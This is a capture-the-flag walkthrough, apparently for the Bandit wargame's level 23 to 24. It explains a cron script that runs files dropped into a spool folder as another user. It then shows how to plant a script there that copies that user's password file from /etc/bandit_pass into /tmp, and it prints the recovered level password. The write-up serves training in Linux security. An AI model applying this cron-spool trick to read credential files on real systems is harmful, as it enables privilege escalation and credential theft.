### Level 23 > Level24

### Goal 

A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

### Walkthrough

The 'cronjob' searching is the same as the script is being runned every seconds,

> we check that the same way we did for previous level 

**Run**

`cd /etc/cron.d`

`ls`

- you will see a bunch of file as we are searching a password for level24 the script running must be run by bandit24 , so we see it it is true or not

**Run**

`cat cronjob_bandit24`

Here you will see a script that is owned by bandit24 is running all the second, you can tell that by seeing '* * * * *', so lets check the script

`cat /usr/bin/cronjob_bandit24.sh`
----
#!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit 
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
  
   if [ "$i" != "." ] && [ "$i" != ".." ];
   
   then
   
   echo "Handling $i"
   
   owner="$(stat --format "%U" "./$i")"
   
   if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
   
   timeout -s 9 60 "./$i"
   
   fi
   
   rm -rf "./$i"
   
   fi

----

So, this is basically the bandit24 script, we know that only bandit24 has the permisssion to acces its password so we will write our own script that we will trick the bandit24 and find its password

**Let's undertand the script**

`myname=$(whoami)` : as the sciript owner is bandit24 the bandit24 is saved on the myname varaiable

`cd /var/spool/"$myname"/foo || exit`: moves to the this folder 

`for i in * .*;` : loops and looks for every file in this folder

`if [ "$i" != "." ] && [ "$i" != ".." ];` : skips the current directory and parent directory cause , we don;t want whole system to delete

`echo "Handling $i"` : list the current file 

`owner="$(stat --format "%U" "./$i")"`: checks the owner of the file

`if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then`: if the owner of the file is bandit23 then only proceed ahead

`timeout -s 9 60 "./$i"` : execute the script/file but run it till 60second and kill the sciprt after that 

`rm -rf "./$i"` : delete the script that you ran to keep it clean.

---

### Let's solve it

1. make a folder in a temp directory 

`mkdir /tmp/fun00`
`cd /tmp/fun00`

now,
Let's write a script 

`echo "cat /etc/bandit_pass/bandit24 > /tmp/fun00/pass.txt" > script.sh`

So. here what we are trying to say is read the password of bandit24 and paste the password in our 'fun00' folder in 'pass.txt' file through 

`>` this means  paste the "" script in script.sh

2. now give the permission for the file to be a owner so basically the owner is bandit23

`chmod 777 script.sh`

3. paste the script to the script of 'cronjob_bandit24'

`cp script.sh /var/spool/bandit24/foo/`

4. chnage the permission of the folder too

`chmod 777 /tmp/fun00`

5. check the password

`ls`

- you will see a pass.txt
- read the file
`cat pss.txt`

> gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
---

***ALISH**
